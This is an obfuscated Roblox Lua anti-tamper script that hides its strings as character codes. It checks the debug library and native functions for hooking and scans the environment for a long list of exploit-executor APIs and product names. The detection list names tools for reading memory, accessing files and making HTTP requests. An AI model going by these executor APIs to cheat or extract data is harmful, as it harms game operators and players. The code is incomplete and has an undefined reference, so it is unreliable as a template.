return (function(...)
 local _0Uyg_GwdmUqfY5,_0Urhyf6KGM6XW9,_0Tn1M0hxkEgvfC,_0Qz_VDyI_EW0Hs,_0FerdnLsRJsv8d,_0eRPIkasoVA95K,_0nFjViaIk7mXkX,_0y1wfmQwehBQuk,_0YBNGJmG5ah4C_,_0gQlsbwO3gAoad,_0xwSxGkFoReAeu,_0b2LEv_3iU6kSl,_0Xq9hhJ26O7QQC,_0W8tVCJ0FkEZEE,_0nqOBQFG80gtjt,_0fMN0Lj2fV2whr,_0iSJchhqavEJtG,_0G9Pv1Suo4kuxE,_0oIdvGVdLMmVx3,_0sbm1QMLJPtp5O,_0v_WjjWIj8RzaL,_0bwzEaGZl82pbd,_0K6netPDByhsc8,_0DSqAu9i5Kj6ap,_0OZ_q1Slcy3g9o
 _0Uyg_GwdmUqfY5,_0Urhyf6KGM6XW9,_0Tn1M0hxkEgvfC,_0Qz_VDyI_EW0Hs,_0FerdnLsRJsv8d,_0eRPIkasoVA95K,_0nFjViaIk7mXkX,_0y1wfmQwehBQuk,_0YBNGJmG5ah4C_,_0gQlsbwO3gAoad,_0xwSxGkFoReAeu,_0b2LEv_3iU6kSl,_0Xq9hhJ26O7QQC,_0W8tVCJ0FkEZEE,_0nqOBQFG80gtjt,_0fMN0Lj2fV2whr,_0iSJchhqavEJtG,_0G9Pv1Suo4kuxE,_0oIdvGVdLMmVx3,_0sbm1QMLJPtp5O,_0v_WjjWIj8RzaL,_0bwzEaGZl82pbd,_0K6netPDByhsc8,_0DSqAu9i5Kj6ap,_0OZ_q1Slcy3g9o=ipairs,pairs,tonumber,tostring,type,math,string,table,pcall,xpcall,select,rawget,rawset,rawequal,setmetatable,getmetatable,coroutine,bit32,typeof,error,assert,next,rawlen,unpack,load
 if math.abs(-1811) < 0 then
  local _0rvDgycc=bit32.bxor(49031,29118)
  local _0w62hpUa=setmetatable({},{__index=function(_,k) return rawget((type(getfenv)=="function" and getfenv(0) or _G),k) end})
  local _0suZymHV=coroutine.wrap(function() coroutine.yield(2462) end)
  local _0kOzMrpW=string.char(74,75,69)
 end
 do
  local _0gdV471sX=tostring
  if type(_0gdV471sX)~="function" then while true do end end
 end

local _0aNwpVGtpV=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,98,117,103)) or debug
local _0qC_PpWWT4=type
local _0lUIfbIicc=pcall
local _0paqSX2oz7=error
local _0cxkemVHus=pairs
local _0lmHVtkaKN=rawget
local _0hPFV63MXK=rawset
local _0IsruXLxhG=rawequal
local _0NU8R1A8qE=getmetatable
local _0ku72OEAoR=setmetatable
local _0IWtJbzCsC=false
local _0UXZm5vfie=""

local function _0GNjIA4aYi()
 if _0qC_PpWWT4(_0aNwpVGtpV)~="table" then return false end
 for _,k in _0cxkemVHus({"getinfo","getlocal","getupvalue","traceback","sethook","setupvalue"}) do
  if _0qC_PpWWT4(_0aNwpVGtpV[k])~="function" then return false end
 end
 return true
end
if not _0GNjIA4aYi() then _0IWtJbzCsC=true;_0UXZm5vfie=string.char(100,101,98,117,103,95,105,110,99,111,109,112,108,101,116,101) end

local function _0VITOTUtfp(f)
 local i=_0aNwpVGtpV.getinfo(f)
 return i and i.what=="C"
end

local function _0DGtyP8E0l()
 local natives={
  _0lUIfbIicc,xpcall,assert,_0paqSX2oz7,print,_0lmHVtkaKN,_0hPFV63MXK,_0IsruXLxhG,tonumber,tostring,_0qC_PpWWT4,
  select,next,ipairs,_0cxkemVHus,collectgarbage,_0NU8R1A8qE,_0ku72OEAoR,
  load,loadstring,loadfile
 }
 local mts={string,table,math,os,_G}
 for _,t in _0cxkemVHus(mts) do
  local mt=_0NU8R1A8qE(t)
  if mt then
   for _,m in _0cxkemVHus({"__index","__newindex","__call","__metatable"}) do
    local mf=mt[m]
    if mf and _0qC_PpWWT4(mf)=="function" and not _0VITOTUtfp(mf) then
     return false,string.char(109,101,116,97,109,101,116,104,111,100,95,116,97,109,112,101,114,101,100)
    end
   end
  end
 end
 for _,fn in _0cxkemVHus(natives) do
  if _0qC_PpWWT4(fn)=="function" and not _0VITOTUtfp(fn) then
   return false,string.char(110,97,116,105,118,101,95,114,101,112,108,97,99,101,100)
  end
 end
 return true
end

local function _0v1dhrNIsZ(f)
 local i=_0aNwpVGtpV.getinfo(f,"Sl")
 return i and i.linedefined==i.lastlinedefined
end

local function _0YDpPqw7Ve(f)
 local i=1
 while true do
  local n,v=_0aNwpVGtpV.getupvalue(f,i)
  if not n then break end
  if _0qC_PpWWT4(v)=="function" and not _0v1dhrNIsZ(v) then return false,string.char(115,117,115,112,105,99,105,111,117,115,95,117,112,118,97,108,117,101) end
  i=i+1
 end
 return true
end

local function _0UFSmo3OyP(l)
 local i=1
 while true do
  local n,v=_0aNwpVGtpV.getlocal(l,i)
  if not n then break end
  if _0qC_PpWWT4(v)=="function" and not _0v1dhrNIsZ(v) then return false,string.char(115,117,115,112,105,99,105,111,117,115,95,108,111,99,97,108) end
  i=i+1
 end
 return true
end

local function _0I6raGLHm4()
 local essentials={"pcall","xpcall","type","tostring","string","table","debug","coroutine","math"}
 for _,k in _0cxkemVHus(essentials) do
  if _0qC_PpWWT4(_G[k])~=_0qC_PpWWT4(rawget((type(getfenv)=="function" and getfenv(0) or _G),k)) then
   return false,string.char(103,108,111,98,97,108,95,109,111,100,105,102,105,101,100)
  end
 end
 return true
end

local function _0ppadcppSz()
 local ok,r=_0DGtyP8E0l()
 if not ok then return false,r end
 ok,r=_0I6raGLHm4()
 if not ok then return false,r end
 for l=2,4 do
  local i=_0aNwpVGtpV.getinfo(l,"f")
  if i and i.func then
   ok,r=_0YDpPqw7Ve(i.func)
   if not ok then return false,r end
  end
  ok,r=_0UFSmo3OyP(l)
  if not ok then return false,r end
 end
 return true
end

_0lUIfbIicc(function()
 local ok,r=_0ppadcppSz()
 if not ok then _0IWtJbzCsC=true;_0UXZm5vfie=tostring(r) end
end)

if _0IWtJbzCsC then

local _0O16icdsvs=Instance.new(string.char(83,99,114,101,101,110,71,117,105))
_0O16icdsvs.Name=string.char(71,111,111,115,101,79,117,116,112,117,116)
_0O16icdsvs.Parent=game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
local _0n7zTNDXJZ=Instance.new(string.char(70,114,97,109,101),_0O16icdsvs)
_0n7zTNDXJZ.Size=UDim2.new(0.3,0,0.15,0)
_0n7zTNDXJZ.Position=UDim2.new(0.35,0,0.4,0)
_0n7zTNDXJZ.BackgroundColor3=Color3.fromRGB(35,35,35)
local _0efwX8FC1x=Instance.new(string.char(84,101,120,116,76,97,98,101,108),_0n7zTNDXJZ)
_0efwX8FC1x.Size=UDim2.new(1,0,0.6,0)
_0efwX8FC1x.Text=string.char(104,101,108,108,111)
_0efwX8FC1x.TextColor3=Color3.fromRGB(255,255,255)
_0efwX8FC1x.BackgroundTransparency=1
_0efwX8FC1x.TextSize=24
local _0UmCzZaugG=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110),_0n7zTNDXJZ)
_0UmCzZaugG.Size=UDim2.new(0.5,0,0.35,0)
_0UmCzZaugG.Position=UDim2.new(0.25,0,0.6,0)
_0UmCzZaugG.Text=string.char(67,108,105,99,107)
_0UmCzZaugG.BackgroundColor3=Color3.fromRGB(60,60,60)
_0UmCzZaugG.TextColor3=Color3.fromRGB(200,200,200)
print(string.char(104,101,108,108,111))
 do
  local _0OjAgd0QWe=_0lUIfbIicc(function()
   local _0C6e3mrkUN=_0aNwpVGtpV and _0aNwpVGtpV.sethook
   if _0qC_PpWWT4(_0gwcChAeGu)=="function" then
    print(string.char(115,116,111,112))
    return
   end
  end)
  print(string.char(115,116,111,112))
 end
 return
end

local _0HPqe1SXm6jO=pcall
local _0DtpP7yxAvKF=false
local _0GiJVkgYP2c0=""
local _0XTl35Ka0AFc
do
 if bit32 and bit32.bxor then _0XTl35Ka0AFc=bit32.bxor
 elseif bit and bit.bxor then _0XTl35Ka0AFc=bit.bxor
 else _0XTl35Ka0AFc=function(a,b)
 local r,s=0,1
 while a>0 or b>0 do
 if a%2~=b%2 then r=r+s end
 a=math.floor(a/2);b=math.floor(b/2);s=s*2
 end;return r
 end
 end
end
do
 _0HPqe1SXm6jO(function()
 local _0MiDEl4zEFRA=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,103,101,110,118))
 if type(_0MiDEl4zEFRA)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,103,101,110,118) end
 local _0v1lHOr3gECD=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,101,110,118))
 if type(_0v1lHOr3gECD)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,114,101,110,118) end
 local _0yzhqDqIoQz6=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,111,111,107,102,117,110,99,116,105,111,110))
 if type(_0yzhqDqIoQz6)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,111,111,107,102,117,110,99,116,105,111,110) end
 local _0sEPMx9s1qoB=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(110,101,119,99,99,108,111,115,117,114,101))
 if type(_0sEPMx9s1qoB)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,101,119,99,99,108,111,115,117,114,101) end
 local _0Hkj0ZmljaWS=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,99,99,108,111,115,117,114,101))
 if type(_0Hkj0ZmljaWS)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(105,115,99,99,108,111,115,117,114,101) end
 local _0y4gfXDzjT0G=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_0y4gfXDzjT0G)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,101,99,111,109,112,105,108,101) end
 local _0A4HjVsQ5FcM=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_0A4HjVsQ5FcM)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,117,109,112,115,116,114,105,110,103) end
 local _0H5Jyh7ksv3Y=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0H5Jyh7ksv3Y)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101) end
 local _0AWfOx7zPTL5=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101))
 if type(_0AWfOx7zPTL5)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101) end
 local _0TeLqFHdQRuz=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,115,116,97,110,116,115))
 if type(_0TeLqFHdQRuz)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,99,111,110,115,116,97,110,116,115) end
 local _0FuRsKYjEgVK=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,117,112,118,97,108,117,101,115))
 if type(_0FuRsKYjEgVK)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,117,112,118,97,108,117,101,115) end
 local _0Fv_gHi_UgZe=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,112,114,111,116,111,115))
 if type(_0Fv_gHi_UgZe)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,112,114,111,116,111,115) end
 local _0V9sCWw74PfH=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(114,101,97,100,102,105,108,101))
 if type(_0V9sCWw74PfH)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,101,97,100,102,105,108,101) end
 local _0bCKKhTycjEX=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(119,114,105,116,101,102,105,108,101))
 if type(_0bCKKhTycjEX)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(119,114,105,116,101,102,105,108,101) end
 local _0jrjdanzzuZ1=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,104,101,99,107,99,97,108,108,101,114))
 if type(_0jrjdanzzuZ1)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,104,101,99,107,99,97,108,108,101,114) end
 local _0ngs0iNTwbDn=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(102,105,99,108,111,110,101))
 if type(_0ngs0iNTwbDn)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(102,105,99,108,111,110,101) end
 local _0xjFCVkyd97_=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,97,116,116,114,105,98,117,116,101))
 if type(_0xjFCVkyd97_)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,97,116,116,114,105,98,117,116,101) end
 local _0hkyu_gzavPr=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,97,116,116,114,105,98,117,116,101))
 if type(_0hkyu_gzavPr)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,97,116,116,114,105,98,117,116,101) end
 local _0rzU9KBT66Nc=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,110,101,99,116,105,111,110,115))
 if type(_0rzU9KBT66Nc)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,99,111,110,110,101,99,116,105,111,110,115) end
 local _0NyBGoQ5Z1T_=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(102,105,114,101,99,108,105,101,110,116))
 if type(_0NyBGoQ5Z1T_)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(102,105,114,101,99,108,105,101,110,116) end
 local _0Hb4rS3d9dMM=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(102,105,114,101,115,101,114,118,101,114))
 if type(_0Hb4rS3d9dMM)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(102,105,114,101,115,101,114,118,101,114) end
 local _0CHjgpYa76_q=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(109,111,117,115,101,108,111,99,107,115,99,114,111,108,108,100,101,108,116,97))
 if type(_0CHjgpYa76_q)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,111,117,115,101,108,111,99,107,115,99,114,111,108,108,100,101,108,116,97) end
 local _0WN_3_B5fFOz=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,99,108,105,112,98,111,97,114,100))
 if type(_0WN_3_B5fFOz)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,99,108,105,112,98,111,97,114,100) end
 local _0pLFJVvGNW6R=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,108,105,112,98,111,97,114,100))
 if type(_0pLFJVvGNW6R)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,99,108,105,112,98,111,97,114,100) end
 local _0EU3Wzw0QLwo=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(98,108,111,99,107,105,110,112,117,116))
 if type(_0EU3Wzw0QLwo)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(98,108,111,99,107,105,110,112,117,116) end
 local _0Mlsgm_c9z4s=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,111,98,106,101,99,116,115))
 if type(_0Mlsgm_c9z4s)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,111,98,106,101,99,116,115) end
 local _0BBhonFKsmgB=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,105,100,101,110,116,105,116,121))
 if type(_0BBhonFKsmgB)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,105,100,101,110,116,105,116,121) end
 local _0tSIR1hZpUOB=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,105,100,101,110,116,105,116,121))
 if type(_0tSIR1hZpUOB)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,105,100,101,110,116,105,116,121) end
 local _0BHB4i7RY1OK=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,116,104,114,101,97,100,105,100,101,110,116,105,116,121))
 if type(_0BHB4i7RY1OK)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,116,104,114,101,97,100,105,100,101,110,116,105,116,121) end
 local _0idpJW5lqck2=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(112,114,111,116,101,99,116,115,99,114,105,112,116))
 if type(_0idpJW5lqck2)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(112,114,111,116,101,99,116,115,99,114,105,112,116) end
 local _0QfshPnhPxhz=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,108,111,110,101,114,101,102))
 if type(_0QfshPnhPxhz)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,108,111,110,101,114,101,102) end
 local _0pB5t18ErxR_=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,101,120,101,99,117,116,111,114,99,108,111,115,117,114,101))
 if type(_0pB5t18ErxR_)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(105,115,101,120,101,99,117,116,111,114,99,108,111,115,117,114,101) end
 local _0oJsPj8_cv47=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,109,111,100,117,108,101,115,116,97,116,101))
 if type(_0oJsPj8_cv47)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,109,111,100,117,108,101,115,116,97,116,101) end
 local _0WEsdbIhG6dH=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,109,111,100,117,108,101,115,116,97,116,101))
 if type(_0WEsdbIhG6dH)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,109,111,100,117,108,101,115,116,97,116,101) end
 local _0I_GFP4tSfWg=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,116,97,99,107))
 if type(_0I_GFP4tSfWg)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,115,116,97,99,107) end
 local _0vICzFWWyVZO=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(114,101,97,100,112,114,111,99,101,115,115,109,101,109,111,114,121))
 if type(_0vICzFWWyVZO)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,101,97,100,112,114,111,99,101,115,115,109,101,109,111,114,121) end
 local _0o7Fi9XHoLJf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(119,114,105,116,101,112,114,111,99,101,115,115,109,101,109,111,114,121))
 if type(_0o7Fi9XHoLJf)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(119,114,105,116,101,112,114,111,99,101,115,115,109,101,109,111,114,121) end
 local _0Xdl8I3nLQbe=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,115))
 if type(_0Xdl8I3nLQbe)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,115,99,114,105,112,116,115) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,111,111,107,109,101,116,97,109,101,116,104,111,100))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,111,111,107,109,101,116,97,109,101,116,104,111,100) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,104,105,100,100,101,110,112,114,111,112,101,114,116,121))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,104,105,100,100,101,110,112,114,111,112,101,114,116,121) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,104,105,100,100,101,110,112,114,111,112,101,114,116,121))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,104,105,100,100,101,110,112,114,111,112,101,114,116,121) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,101,103,105,115,116,114,121))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,114,101,103,105,115,116,114,121) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,103,99))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,103,99) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(102,105,108,116,101,114,103,99))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(102,105,108,116,101,114,103,99) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,97,108,108,98,97,99,107,118,97,108,117,101))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,99,97,108,108,98,97,99,107,118,97,108,117,101) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,99,97,108,108,98,97,99,107,118,97,108,117,101))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,99,97,108,108,98,97,99,107,118,97,108,117,101) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,117,110,110,105,110,103,115,99,114,105,112,116,115))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,114,117,110,110,105,110,103,115,99,114,105,112,116,115) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,114,101,115,99,114,105,112,116))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,99,111,114,101,115,99,114,105,112,116) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,102,117,110,99,116,105,111,110,99,108,111,115,117,114,101))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,102,117,110,99,116,105,111,110,99,108,111,115,117,114,101) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(114,101,112,108,97,99,101,99,108,111,115,117,114,101))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,101,112,108,97,99,101,99,108,111,115,117,114,101) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,121,110,46,114,101,113,117,101,115,116))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,121,110,46,114,101,113,117,101,115,116) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,121,110,46,112,114,111,116,101,99,116))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,121,110,46,112,114,111,116,101,99,116) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,116,116,112,103,101,116))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,116,116,112,103,101,116) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,116,116,112,112,111,115,116))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,116,116,112,112,111,115,116) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,108,99,108,111,115,117,114,101))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(105,115,108,99,108,111,115,117,114,101) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,105,110,102,111))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,115,99,114,105,112,116,105,110,102,111) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,101,110,118))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,115,101,110,118) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,109,101,110,118))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,109,101,110,118) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,105,110,115,116,97,110,99,101,115))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,105,110,115,116,97,110,99,101,115) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,110,111,99,108,105,112,98,111,97,114,100))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,110,111,99,108,105,112,98,111,97,114,100) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(114,101,113,117,101,115,116))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,101,113,117,101,115,116) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,110,97,109,101,99,97,108,108,109,101,116,104,111,100))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,116,110,97,109,101,99,97,108,108,109,101,116,104,111,100) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,110,97,109,101,99,97,108,108,109,101,116,104,111,100))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,110,97,109,101,99,97,108,108,109,101,116,104,111,100) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,115,121,115,116,101,109,99,108,111,115,117,114,101))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(105,115,115,121,115,116,101,109,99,108,111,115,117,114,101) end
 local undefined=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,108,111,110,101,102,117,110,99,116,105,111,110))
 if type(undefined)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,108,111,110,101,102,117,110,99,116,105,111,110) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,121,110))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,121,110) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(75,82,78,76,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,107,114,110,108,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(83,69,78,84,73,78,69,76,95,86,50))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,101,110,116,105,110,101,108,95,118,50) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(102,108,117,120,117,115))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,102,108,117,120,117,115) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,101,108,101,114,121))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,99,101,108,101,114,121) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(79,120,121,103,101,110))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,111,120,121,103,101,110) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(68,101,108,116,97))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,100,101,108,116,97) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(69,108,101,99,116,114,111,110))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,101,108,101,99,116,114,111,110) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(87,97,118,101))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,119,97,118,101) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,114,105,103,111,110))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,116,114,105,103,111,110) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,99,114,105,112,116,119,97,114,101))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,99,114,105,112,116,119,97,114,101) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(88,101,110,111))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,120,101,110,111) end
